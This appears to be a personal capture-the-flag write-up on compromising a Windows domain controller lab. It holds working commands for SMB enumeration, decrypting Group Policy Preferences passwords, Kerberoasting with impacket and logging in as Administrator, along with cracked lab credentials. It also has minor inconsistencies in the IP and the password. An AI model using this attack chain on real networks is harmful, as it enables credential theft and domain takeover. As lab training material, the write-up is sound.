---
Status: Done
OS: Windows AD
Difficulty: Easy
tags:
  - GPP
  - SMB
  - Kerberoast
Date: 2026-07-01T22:34:00
Owned: 2026-07-02T11:39:00
---

---

# Enumeration
## port scan
rustscan result  
```
rustscan -a 10.129.14.10 --ulimit 5000 | tee rust.txt
```
![[Pasted image 20260701223500.png]]
naabu result  
![[Pasted image 20260701223752.png]]
i think rustscan is better  

## smb
anonymous smb can read replication share
![[Pasted image 20260701233638.png]]
get the file  
![[Pasted image 20260702094007.png]]
is this even relevant?  
![[Pasted image 20260702094153.png]]
i think this share is for setting up the lab lol  

there is indeed a credential D:  
![[Pasted image 20260702104208.png]]
`active.htb/SVC_TGS:edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`

# Messing around
## Enum4linux-ng
trying this in case we found something interesting  
```
enum4linux-ng -A -u '' -p '' 10.129.14.66
```
result nothing popped out  
```
ENUM4LINUX - next generation (v1.3.7)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.129.14.66
[*] Username ......... ''
[*] Random Username .. 'aykjtxpw'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 =====================================
|    Listener Scan on 10.129.14.66    |
 =====================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ====================================================
|    Domain Information via LDAP for 10.129.14.66    |
 ====================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: active.htb

 ===========================================================
|    NetBIOS Names and Workgroup/Domain for 10.129.14.66    |
 ===========================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 =========================================
|    SMB Dialect Check on 10.129.14.66    |
 =========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                                                                      
  SMB 1.0: false                                                                                                         
  SMB 2.0.2: true                                                                                                        
  SMB 2.1: true                                                                                                          
  SMB 3.0: false                                                                                                         
  SMB 3.1.1: false                                                                                                       
Preferred dialect: SMB 2.1                                                                                               
SMB1 only: false                                                                                                         
SMB signing required: true                                                                                               

 ===========================================================
|    Domain Information via SMB session for 10.129.14.66    |
 ===========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC                                                                                                
NetBIOS domain name: ACTIVE                                                                                              
DNS domain: active.htb                                                                                                   
FQDN: DC.active.htb                                                                                                      
Derived membership: domain member                                                                                        
Derived domain: ACTIVE                                                                                                   

 =========================================
|    RPC Session Check on 10.129.14.66    |
 =========================================
[*] Check for anonymous access (null session)
[+] Server allows authentication via username '' and password ''
[*] Check for guest access
[-] Could not establish guest session: STATUS_LOGON_FAILURE

 ===================================================
|    Domain Information via RPC for 10.129.14.66    |
 ===================================================
[-] Could not get domain information via 'lsaquery': STATUS_ACCESS_DENIED

 ===============================================
|    OS Information via RPC for 10.129.14.66    |
 ===============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[+] Found OS information via 'srvinfo'
[+] After merging OS information we have the following result:
OS: Windows 7, Windows Server 2008 R2                                                                                    
OS version: '6.1'                                                                                                        
OS release: ''                                                                                                           
OS build: '7601'                                                                                                         
Native OS: not supported                                                                                                 
Native LAN manager: not supported                                                                                        
Platform id: '500'                                                                                                       
Server type: '0x80102b'                                                                                                  
Server type string: Wk Sv PDC Tim NT     Domain Controller                                                               

 =====================================
|    Users via RPC on 10.129.14.66    |
 =====================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED

 ======================================
|    Groups via RPC on 10.129.14.66    |
 ======================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED

 ======================================
|    Shares via RPC on 10.129.14.66    |
 ======================================
[*] Enumerating shares
[+] Found 7 share(s):
ADMIN$:                                                                                                                  
  comment: Remote Admin                                                                                                  
  type: Disk                                                                                                             
C$:                                                                                                                      
  comment: Default share                                                                                                 
  type: Disk                                                                                                             
IPC$:                                                                                                                    
  comment: Remote IPC                                                                                                    
  type: IPC                                                                                                              
NETLOGON:                                                                                                                
  comment: Logon server share                                                                                            
  type: Disk                                                                                                             
Replication:                                                                                                             
  comment: ''                                                                                                            
  type: Disk                                                                                                             
SYSVOL:                                                                                                                  
  comment: Logon server share                                                                                            
  type: Disk                                                                                                             
Users:                                                                                                                   
  comment: ''                                                                                                            
  type: Disk                                                                                                             
[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share IPC$
[+] Mapping: OK, Listing: DENIED
[*] Testing share NETLOGON
[+] Mapping: DENIED, Listing: N/A
[*] Testing share Replication
[+] Mapping: OK, Listing: OK
[*] Testing share SYSVOL
[+] Mapping: DENIED, Listing: N/A
[*] Testing share Users
[+] Mapping: DENIED, Listing: N/A

 =========================================
|    Policies via RPC for 10.129.14.66    |
 =========================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: session failed

 =========================================
|    Printers via RPC for 10.129.14.66    |
 =========================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED

Completed after 14.35 seconds
```
maybe we could exploit the OS version  
![[Pasted image 20260702095017.png]]
oh the classic one, let's try out eternal blue  
![[Pasted image 20260702095128.png]]
I think eternalblue won't work since SMBv1 is not open  
![[Pasted image 20260702095704.png]]
I thought so...  

## port 464 Kpasswd
![[Pasted image 20260702100316.png]]
administrator@active.htb

## zerologon
zerologon tester https://github.com/bvcyber/CVE-2020-1472  
this one does not exploit  
![[Pasted image 20260702101744.png]]
look like it works let's try the exploit then https://github.com/dirkjanm/CVE-2020-1472/tree/master  
the exploit says it need python 3.6 or newer I currently have 3.13  
![[Pasted image 20260702102513.png]]
if it's actually run without problem the administrator password should be set to blank  

tried connect to SMB using administrator with blank password did not work  
impacket-secretdump -just-dc also did not work  

# Exploit

from smb anonymous share  
`active.htb/SVC_TGS:edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`

I tried to identify the hash using hashcat, name the hash. They don't know the hash.
but from the file name and the path which is `/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml`

from researching about group policies
![[Pasted image 20260702105004.png]]
I think it is AES-256 let's try to decrypt it  
```
openssl enc -d -aes-256-cbc -in cpasswd.enc -out decrypted.txt
```
![[Pasted image 20260702105231.png]]
we need to input the decryption password which was stated that microsoft has published it  
searching for the key I found this repo instead https://github.com/t0thkr1s/gpp-decrypt  
```
python3 -m venv venv
source venv/bin/activate
pip install gpp-decrypt
```

![[Pasted image 20260702110027.png]]
this usage page is a lie meh, we don't need any flag  
![[Pasted image 20260702110239.png]]
SVC_TGS:GPPstillStandingStrong2k18d

now we can read more shares  
![[Pasted image 20260702110812.png]]

```
impacket-smbclient active.htb/SVC_TGS:GPPstillStandingStrong2k18@10.129.14.66
```

![[Pasted image 20260702111211.png]]
we can get user.txt on SVC_TGS's desktop  

# Post-Exploit

since we already have valid creds what we can do is kerberoast  
```sh
impacket-GetUserSPNs -request -dc-ip 10.129.14.66 active.htb/SVC_TGS:GPPstillStandingStrong2k18
```
got the admin hash  
![[Pasted image 20260702111357.png]]
we can add output flag so we dont have to copy paste `-outputfile tgs.hashes`
cracked!!  
![[Pasted image 20260702111616.png]]
Administrator:Ticketmaster1968

let's get the flag using smbclient again  
```
impacket-smbclient active.htb/Administrator:Ticketmaster1968@10.129.14.66
```
![[Pasted image 20260702111749.png]]

# Lesson Learned 
enumerate shares content thoroughly, especially .xml .txt file  
